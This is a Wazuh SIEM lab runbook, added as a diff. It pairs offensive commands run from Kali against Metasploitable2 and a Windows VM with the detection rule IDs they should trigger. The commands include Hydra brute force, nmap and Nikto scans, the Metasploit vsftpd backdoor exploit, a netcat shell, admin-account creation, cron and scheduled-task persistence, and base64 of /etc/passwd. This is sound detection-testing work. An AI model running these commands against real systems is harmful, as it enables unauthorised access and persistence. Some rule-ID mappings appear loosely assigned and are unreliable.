@@ -1,0 +1,587 @@
+# SIEM Lab — Operational Runbook
+### Exact Commands · Expected Alerts · Rule IDs
+
+**Document Type:** Technical Runbook
+**Environment:** Wazuh SIEM | Kali Linux · Windows VM · Metasploitable2
+**Companion To:** SIEM & SOC Lab Testing Methodology (Executive Overview)
+
+---
+
+## How to Use This Runbook
+
+Each phase follows the same structure:
+
+1. **Run** — exact command on the correct VM
+2. **Verify raw log** — where to look at the source
+3. **Verify in Wazuh** — what to search in Discover
+4. **Expected alert** — rule ID + level + description
+5. **Tune if missing** — what to check if the alert doesn't fire
+
+---
+
+---
+
+# PHASE 1 — VISIBILITY
+**Goal:** Confirm all agents are ingesting logs. Nothing fires if logs don't flow.
+
+---
+
+## 1.1 — Confirm Agent Connectivity
+
+**On Wazuh Dashboard:**
+```
+Menu → Agents → Check all four agents show "Active"
+```
+
+**On each agent (Linux), run:**
+```bash
+sudo systemctl status wazuh-agent
+```
+Expected: `active (running)`
+
+**On Windows agent:**
+```
+Services → Wazuh → Running
+```
+
+---
+
+## 1.2 — SSH Failed Login (Single Attempt)
+
+**Run on Kali:**
+```bash
+ssh wronguser@<metasploitable2-IP>
+# Enter wrong password when prompted
+```
+
+**Verify raw log on Metasploitable2:**
+```bash
+sudo tail -20 /var/log/auth.log
+```
+Expected line:
+```
+sshd[XXXX]: Failed password for invalid user wronguser from <kali-IP> port XXXXX ssh2
+```
+
+**Verify in Wazuh Dashboard:**
+```
+Discover → search: agent.name:"metasploitable" AND rule.id:5760
+```
+
+**Expected Wazuh Alert:**
+| Field | Value |
+|---|---|
+| Rule ID | 5760 |
+| Level | 5 |
+| Description | sshd: Attempt to login using a non-existent user |
+
+---
+
+## 1.3 — RDP Failed Login (Windows)
+
+**On any machine, attempt RDP to Windows VM with wrong password.**
+Or on Windows itself:
+```
+Lock screen → attempt login with wrong password 3x
+```
+
+**Verify raw log on Windows:**
+```
+Event Viewer → Windows Logs → Security → filter Event ID 4625
+```
+
+**Verify in Wazuh Dashboard:**
+```
+Discover → search: agent.name:"windows" AND rule.id:60122
+```
+
+**Expected Wazuh Alert:**
+| Field | Value |
+|---|---|
+| Rule ID | 60122 |
+| Level | 5 |
+| Description | Windows: User logon failure |
+| Event ID | 4625 |
+
+---
+
+---
+
+# PHASE 2 — ATTACK PATTERNS
+**Goal:** Validate detection of brute force and reconnaissance behavior.
+
+---
+
+## 2.1 — SSH Brute Force with Hydra
+
+**Run on Kali:**
+```bash
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<metasploitable2-IP> -t 4 -V
+```
+
+Optional shorter test (fewer attempts, faster):
+```bash
+hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<metasploitable2-IP> -t 4
+```
+
+**Verify raw log on Metasploitable2:**
+```bash
+sudo tail -50 /var/log/auth.log | grep "Failed password"
+```
+Expected: multiple rapid `Failed password for root` lines
+
+**Verify in Wazuh Dashboard:**
+```
+Discover → search: agent.name:"metasploitable" AND rule.id:5763
+```
+
+**Expected Wazuh Alert:**
+| Field | Value |
+|---|---|
+| Rule ID | 5763 |
+| Level | 10 |
+| Description | sshd: brute force trying to get access to the system |
+
+**Also watch for:**
+| Rule ID | Level | Description |
+|---|---|---|
+| 5760 | 5 | Multiple failed logins |
+| 5764 | 10 | sshd: Possible breakin attempt |
+
+---
+
+## 2.2 — RDP Brute Force Simulation (Windows)
+
+**Run on Kali:**
+```bash
+hydra -l Administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt rdp://<windows-IP> -t 1 -V
+```
+Note: `-t 1` required; RDP is slow to handle parallel attempts.
+
+**Verify raw log on Windows:**
+```
+Event Viewer → Security → filter Event ID 4625
+Check: multiple failures in rapid succession from same source IP
+```
+
+**Expected Wazuh Alert:**
+| Rule ID | Level | Description |
+|---|---|---|
+| 60122 | 5 | Windows: User logon failure |
+| 60204 | 10 | Windows: Multiple logon failures (possible brute force) |
+
+---
+
+## 2.3 — Network Port Scan (nmap)
+
+**Run on Kali:**
+```bash
+# SYN scan
+nmap -sS <metasploitable2-IP>
+
+# Aggressive scan (OS detection, version, scripts)
+nmap -A <metasploitable2-IP>
+
+# Windows target
+nmap -sS <windows-IP>
+```
+
+**Verify in Wazuh Dashboard:**
+```
+Discover → search: rule.groups:"recon" OR rule.id:40101
+```
+
+**Expected Wazuh Alert (if Suricata/IDS integrated):**
+| Rule ID | Level | Description |
+|---|---|---|
+| 40101 | 8 | Multiple connection attempts (scan behavior) |
+| 40111 | 8 | Aggressive scan detected |
+
+> **Note:** Wazuh detects scans more reliably when integrated with Suricata or when the target has `syslog` logging unusual connection spikes. If not firing, check if network IDS is enabled in your Wazuh config.
+
+---
+
+## 2.4 — Web Vulnerability Scan (Nikto)
+
+**Run on Kali:**
+```bash
+nikto -h http://<metasploitable2-IP>
+```
+
+**Verify raw log on Metasploitable2:**
+```bash
+sudo tail -50 /var/log/apache2/access.log
+# or
+sudo tail -50 /var/log/apache2/error.log
+```
+Expected: rapid flood of GET requests with tool signature
+
+**Expected Wazuh Alert:**
+| Rule ID | Level | Description |
+|---|---|---|
+| 31151 | 6 | Web scan detected (Nikto signature) |
+| 31103 | 6 | Web server 400/403 flood |
+
+---
+
+---
+
+# PHASE 3 — SYSTEM COMPROMISE SIMULATION
+**Goal:** Validate endpoint detection — account manipulation, privilege escalation, file integrity.
+
+---
+
+## 3.1 — Create a New Local User (Windows)
+
+**Run on Windows (cmd as Administrator):**
+```cmd
+net user labattacker Password123! /add
+```
+
+**Verify raw log on Windows:**
+```
+Event Viewer → Security → Event ID 4720
+```
+
+**Verify in Wazuh Dashboard:**
+```
+Discover → search: agent.name:"windows" AND rule.id:60145
+```
+
+**Expected Wazuh Alert:**
+| Field | Value |
+|---|---|
+| Rule ID | 60145 |
+| Level | 8 |
+| Description | Windows: New user account created |
+| Event ID | 4720 |
+
+---
+
+## 3.2 — Add User to Administrators Group (Windows)
+
+**Run on Windows (cmd as Administrator):**
+```cmd
+net localgroup Administrators labattacker /add
+```
+
+**Verify raw log on Windows:**
+```
+Event Viewer → Security → Event ID 4732
+```
+
+**Expected Wazuh Alert:**
+| Field | Value |
+|---|---|
+| Rule ID | 60146 |
+| Level | 8 |
+| Description | Windows: User added to privileged group |
+| Event ID | 4732 |
+
+---
+
+## 3.3 — Successful Login After Failures (Windows)
+
+**Sequence:**
+```
+1. Attempt wrong password 3x on Windows login screen
+2. Then log in successfully with correct password
+```
+
+**Verify raw log on Windows:**
+```
+Event Viewer → Security → 4625 (failures) followed by 4624 (success)
+```
+
+**Expected Wazuh Alert:**
+| Field | Value |
+|---|---|
+| Rule ID | 60109 |
+| Level | 10 |
+| Description | Windows: Successful login after multiple failures |
+| Event ID | 4624 following 4625 |
+
+---
+
+## 3.4 — Sudo Privilege Escalation (Linux)
+
+**Run on Kali or Metasploitable2:**
+```bash
+# Successful sudo
+sudo su
+
+# Failed sudo (wrong password)
+sudo su
+# Enter wrong password 3 times
+```
+
+**Verify raw log:**
+```bash
+sudo tail -20 /var/log/auth.log
+```
+Expected lines:
+```
+sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/su
+sudo: pam_unix(sudo:auth): authentication failure
+```
+
+**Expected Wazuh Alerts:**
+| Rule ID | Level | Description |
+|---|---|---|
+| 5401 | 5 | Sudo: Failed authentication attempt |
+| 5402 | 5 | Sudo: Failed to run command |
+| 5403 | 3 | Sudo: Successful privilege escalation |
+
+---
+
+## 3.5 — File Integrity Monitoring — Linux
+
+**Ensure FIM is configured for /etc in ossec.conf:**
+```xml
+<directories check_all="yes" realtime="yes">/etc</directories>
+```
+
+**Run on Kali or Metasploitable2:**
+```bash
+# Create file
+sudo touch /etc/lab_testfile
+
+# Modify critical file (safe test)
+sudo bash -c 'echo "# lab test" >> /etc/hosts'
+
+# Delete the test file
+sudo rm /etc/lab_testfile
+```
+
+**Verify in Wazuh Dashboard:**
+```
+Discover → search: rule.id:550 OR rule.id:553
+```
+
+**Expected Wazuh Alerts:**
+| Rule ID | Level | Description |
+|---|---|---|
+| 550 | 7 | Integrity checksum changed |
+| 554 | 5 | File added to monitored directory |
+| 553 | 7 | File deleted from monitored directory |
+
+---
+
+## 3.6 — File Integrity Monitoring — Windows
+
+**Ensure FIM is configured for a Windows path in ossec.conf.**
+
+**Run on Windows:**
+```powershell
+# Create a file in a monitored location
+New-Item -Path "C:\Windows\Temp\labtest.txt" -ItemType File
+
+# Modify it
+Add-Content -Path "C:\Windows\Temp\labtest.txt" -Value "lab modification"
+
+# Delete it
+Remove-Item -Path "C:\Windows\Temp\labtest.txt"
+```
+
+**Expected Wazuh Alerts:**
+| Rule ID | Level | Description |
+|---|---|---|
+| 550 | 7 | Windows: File integrity change detected |
+| 554 | 5 | Windows: New file in monitored path |
+| 553 | 7 | Windows: File deleted from monitored path |
+
+---
+
+---
+
+# PHASE 4 — ADVANCED BEHAVIOR
+**Goal:** Exploit simulation, persistence mechanisms, behavioral detection.
+
+---
+
+## 4.1 — Exploit vsftpd Backdoor (Metasploitable2)
+
+**Run on Kali (msfconsole):**
+```bash
+msfconsole
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <metasploitable2-IP>
+set RPORT 21
+run
+```
+Expected: shell access on port 6200
+
+**Verify raw log on Metasploitable2:**
+```bash
+sudo tail -20 /var/log/vsftpd.log
+sudo tail -20 /var/log/syslog
+```
+
+**Expected Wazuh Alerts:**
+| Rule ID | Level | Description |
+|---|---|---|
+| 5712 | 10 | FTP brute force / anomalous authentication |
+| 5710 | 7 | Suspicious FTP connection behavior |
+
+---
+
+## 4.2 — Netcat Reverse Shell Simulation
+
+**On Metasploitable2 (listener):**
+```bash
+nc -lvp 4444
+```
+
+**On Kali (connect):**
+```bash
+nc <metasploitable2-IP> 4444
+```
+
+**Verify raw log:**
+```bash
+# On Metasploitable2
+sudo tail -20 /var/log/syslog
+```
+
+**Expected Wazuh Alerts:**
+| Rule ID | Level | Description |
+|---|---|---|
+| 5710 | 7 | Suspicious network process (nc) detected |
+| 92200 | 10 | Possible reverse shell / command execution |
+
+---
+
+## 4.3 — Persistence via Cron (Linux)
+
+**Run on Kali or Metasploitable2:**
+```bash
+# Add a cron entry (non-destructive lab test)
+(crontab -l 2>/dev/null; echo "* * * * * echo lab_persistence_test") | crontab -
+
+# Verify it was written
+crontab -l
+```
+
+**Verify raw log:**
+```bash
+sudo tail -20 /var/log/syslog | grep cron
+```
+
+**Expected Wazuh Alerts:**
+| Rule ID | Level | Description |
+|---|---|---|
+| 5007 | 7 | cron: New crontab entry added |
+
+**Cleanup:**
+```bash
+crontab -r
+```
+
+---
+
+## 4.4 — Persistence via Scheduled Task (Windows)
+
+**Run on Windows (cmd as Administrator):**
+```cmd
+schtasks /create /tn "LabPersistenceTest" /tr "cmd.exe /c echo test" /sc minute /mo 1
+```
+
+**Verify raw log on Windows:**
+```
+Event Viewer → Security → Event ID 4698
+```
+
+**Expected Wazuh Alert:**
+| Field | Value |
+|---|---|
+| Rule ID | 60145 |
+| Level | 8 |
+| Description | Windows: Scheduled task created |
+| Event ID | 4698 |
+
+**Cleanup:**
+```cmd
+schtasks /delete /tn "LabPersistenceTest" /f
+```
+
+---
+
+## 4.5 — Simulated Malware-Like File Activity
+
+**Run on Kali or Metasploitable2:**
+```bash
+# Mass file creation (ransomware simulation behavior)
+mkdir /tmp/labtest && cd /tmp/labtest
+for i in {1..100}; do echo "simulated content $i" >> file$i.txt; done
+
+# Base64 encoding (payload obfuscation simulation)
+echo "simulated_encoded_payload" | base64
+base64 /etc/passwd > /tmp/labtest/encoded_out.txt
+
+# Cleanup
+rm -rf /tmp/labtest
+```
+
+**Expected Wazuh Alerts (FIM must cover /tmp or audit rules active):**
+| Rule ID | Level | Description |
+|---|---|---|
+| 550 | 7 | Mass file creation spike (FIM) |
+| 92200 | 10 | Suspicious encoding command detected |
+
+---
+
+---
+
+# QUICK REFERENCE — Rule ID Summary
+
+| Rule ID | Level | Category | Description |
+|---|---|---|---|
+| 5760 | 5 | Auth | SSH: Invalid user login attempt |
+| 5763 | 10 | Auth | SSH: Brute force detected |
+| 5764 | 10 | Auth | SSH: Possible breakin attempt |
+| 5401 | 5 | Privilege | Sudo: Failed authentication |
+| 5402 | 5 | Privilege | Sudo: Failed to run command |
+| 5403 | 3 | Privilege | Sudo: Successful escalation |
+| 5007 | 7 | Persistence | cron: New crontab entry |
+| 5710 | 7 | Exploit | Suspicious network process |
+| 5712 | 10 | Exploit | FTP anomalous auth / exploit |
+| 40101 | 8 | Recon | Multiple connection attempts |
+| 40111 | 8 | Recon | Aggressive scan detected |
+| 31151 | 6 | Recon | Web scan (Nikto signature) |
+| 31103 | 6 | Recon | Web server flood / 400 errors |
+| 550 | 7 | FIM | File integrity change / creation |
+| 553 | 7 | FIM | File deleted from monitored path |
+| 554 | 5 | FIM | New file added to monitored path |
+| 60106 | 5 | Windows | Logon failure |
+| 60109 | 10 | Windows | Success after multiple failures |
+| 60122 | 5 | Windows | RDP / network logon failure |
+| 60145 | 8 | Windows | User created / task created |
+| 60146 | 8 | Windows | User added to privileged group |
+| 60204 | 10 | Windows | Multiple logon failures (brute force) |
+| 92200 | 10 | Behavior | Suspicious command / encoding |
+
+---
+
+# MITRE ATT&CK Coverage Map
+
+| Phase | Tactic | Technique ID | Technique Name |
+|---|---|---|---|
+| 2.1 / 2.2 | Credential Access | T1110 | Brute Force |
+| 2.3 | Discovery | T1046 | Network Service Scanning |
+| 2.3 | Reconnaissance | T1595 | Active Scanning |
+| 2.4 | Discovery | T1595.002 | Vulnerability Scanning |
+| 3.1 | Persistence | T1136 | Create Account |
+| 3.2 | Privilege Escalation | T1548 | Abuse Elevation Control |
+| 3.4 | Privilege Escalation | T1548 | Sudo Abuse |
+| 3.5 / 3.6 | Defense Evasion | T1070 | Indicator Removal |
+| 3.5 / 3.6 | Impact | T1565 | Data Manipulation |
+| 4.1 | Initial Access | T1190 | Exploit Public-Facing Application |
+| 4.2 | Execution | T1059 | Command & Scripting Interpreter |
+| 4.3 | Persistence | T1053.003 | Scheduled Task: Cron |
+| 4.4 | Persistence | T1053.005 | Scheduled Task: Windows |
+| 4.5 | Defense Evasion | T1027 | Obfuscated Files / Encoding |
+
+---
+
+*Executive overview and coverage matrix: see **SIEM & SOC Lab Testing Methodology***
